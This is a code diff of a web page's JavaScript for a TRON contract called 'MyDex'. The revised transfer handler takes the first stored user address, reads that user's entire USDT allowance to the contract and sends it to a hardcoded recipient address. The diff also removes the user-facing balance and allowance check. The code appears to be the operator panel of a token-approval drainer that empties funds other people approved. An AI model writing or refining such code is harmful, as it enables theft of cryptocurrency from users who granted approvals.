@@ -186,81 +186,65 @@
 
     // 轉帳 USDT (從授權地址到指定地址)
     transferFromButton.onclick = async () => {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        alert("請先連接錢包");
-        return;
-      }
+  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+    alert("請先連接錢包");
+    return;
+  }
 
-      try {
-        const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
-        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
+  try {
+    const MyDex = await window.tronWeb.contract(MyDex_ABI, MyDex_contractAddress);
+    const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
 
-        // 從合約的 users 陣列中取第一個地址(假設為授權地址)
-        const fromHex = await MyDex.getIndexAddress(0).call();
-        const from = window.tronWeb.address.fromHex(fromHex);
-        console.log("fromHex:", fromHex);
-        console.log("from (Base58):", from);
+    const fromHex = await MyDex.getIndexAddress(0).call();
+    const from = window.tronWeb.address.fromHex(fromHex);
+    const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 你的接收者地址
 
-        // 轉帳目標地址，這裡硬編寫示範
-        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B";
-        console.log("to:", to);
+    let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+    if (!allowance) {
+      alert("未取得 allowance，無法執行轉帳");
+      return;
+    }
+    allowance = window.tronWeb.toBigNumber(allowance).toString();
 
-        // 查詢授權額度
-        let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
-        allowance = window.tronWeb.toBigNumber(allowance).toString();
-        console.log("allowance:", allowance);
+    if (BigInt(allowance) === 0n) {
+      alert("尚未授權，無法轉帳");
+      return;
+    }
 
-        if (BigInt(allowance) === 0n) {
-          alert("尚未授權，無法轉帳");
-          return;
-        }
+    const fromStr = String(from);
+    const toStr = String(to);
+    const allowanceStr = String(allowance);
 
-        // 參數字串化
-        const fromStr = String(from);
-        const toStr = String(to);
-        const allowanceStr = String(allowance);
+    console.log("📦 Transfer 準備參數：", { fromStr, toStr, allowanceStr });
 
-        console.log({ fromStr, toStr, allowanceStr });
+    // 檢查 call 是否成功（不消耗 TRX）
+    try {
+      const testCall = await MyDex.transferFrom(fromStr, toStr, allowanceStr).call();
+      console.log("✅ call 成功，返回值：", testCall);
+    } catch (callErr) {
+      console.error("❌ call 測試失敗：", callErr);
+      alert("⚠️ call 測試失敗，轉帳條件不符合（例如餘額不足或未授權）");
+      return;
+    }
 
-        // 先嘗試 call 測試參數有效性
-        await MyDex.transferFrom(fromStr, toStr, allowanceStr).call();
+    // 執行 send（實際發送交易）
+    try {
+      const tx = await MyDex.transferFrom(fromStr, toStr, allowanceStr).send({ feeLimit: 100_000_000 });
+      console.log("✅ 轉帳成功，交易資訊：", tx);
+      alert("🎉 轉帳成功！");
+    } catch (sendErr) {
+      console.error("❌ send 發送失敗，錯誤物件：", sendErr);
+      console.log("📛 sendErr.message:", sendErr.message);
+      if (sendErr.transaction) console.log("📋 sendErr.transaction:", sendErr.transaction);
+      if (sendErr.error) console.log("💥 sendErr.error:", sendErr.error);
+      alert("❌ 轉帳失敗，請確認授權狀態、餘額與 TRX 手續費是否足夠");
+    }
 
-        // 執行交易，帶手續費限制
-        const tx = await MyDex.transferFrom(fromStr, toStr, allowanceStr).send({ feeLimit: 100_000_000 });
-        console.log("轉帳成功", tx);
-        alert("轉帳成功");
-      } catch (err) {
-        console.error("轉帳失敗", err);
-        alert("轉帳失敗，請確認授權狀態與 TRX 餘額");
-      }
-    };
-
-    // 查詢目前授權與餘額
-    checkBtn.onclick = async () => {
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        alert("請先連接錢包");
-        return;
-      }
-
-      const userAddress = window.tronWeb.defaultAddress.base58;
-
-      try {
-        const USDT = await window.tronWeb.contract(TRC20_ABI, USDT_contractAddress);
-
-        // 查餘額
-        let balance = await USDT.balanceOf(userAddress).call();
-        // 查授權額度
-        let allowance = await USDT.allowance(userAddress, MyDex_contractAddress).call();
-
-        balance = window.tronWeb.toBigNumber(balance).toString();
-        allowance = window.tronWeb.toBigNumber(allowance).toString();
-
-        alert(`地址: ${userAddress}\nUSDT 餘額: ${balance}\n授權額度: ${allowance}`);
-      } catch (error) {
-        console.error("查詢錯誤:", error);
-        alert("查詢失敗，請確認錢包連接與合約地址");
-      }
-    };
+  } catch (err) {
+    console.error("🛑 程式邏輯錯誤：", err);
+    alert("執行失敗，請查看控制台日誌");
+  }
+};
   </script>
 </body>
 </html>
